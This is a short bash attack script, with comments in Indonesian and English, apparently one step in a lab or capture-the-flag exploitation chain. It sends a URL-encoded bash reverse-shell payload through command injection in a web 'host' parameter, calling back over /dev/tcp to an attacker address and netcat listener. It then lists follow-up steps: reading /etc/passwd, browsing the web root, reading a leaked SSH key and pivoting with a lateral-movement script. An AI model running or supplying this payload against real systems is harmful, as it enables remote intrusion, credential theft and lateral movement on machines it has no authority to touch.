#!/bin/bash
# ====================================================================
# Trigger reverse shell - jalankan setelah listener ready
# ====================================================================

TARGET_IP="${TARGET_IP:-10.10.10.10}"
ATTACKER_IP="${ATTACKER_IP:-10.10.10.99}"
LISTENER_PORT="${LISTENER_PORT:-4444}"

echo "[*] Triggering reverse shell..."
echo "    Target: ${TARGET_IP}"
echo "    Callback: ${ATTACKER_IP}:${LISTENER_PORT}"
echo ""
echo "[*] PASTIKAN listener udah running di terminal lain:"
echo "    nc -lvnp ${LISTENER_PORT}"
echo ""
read -p "Press ENTER untuk trigger payload..."

# URL-encoded reverse shell payload
PAYLOAD="bash -c 'bash -i >%26 /dev/tcp/${ATTACKER_IP}/${LISTENER_PORT} 0>%261'"
ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${PAYLOAD}'))")

echo "[*] Sending payload..."
curl -s --max-time 3 "http://${TARGET_IP}/?host=8.8.8.8;${ENCODED}" > /dev/null &

echo "[+] Payload sent. Check your listener!"
echo ""
echo "Next steps di reverse shell:"
echo "  1. id; hostname; uname -a"
echo "  2. cat /etc/passwd"
echo "  3. ls -la /var/www/html/"
echo "  4. cat /var/www/html/.maintenance_key   # leaked SSH key!"
echo "  5. Run ./03-lateral.sh untuk pivot"
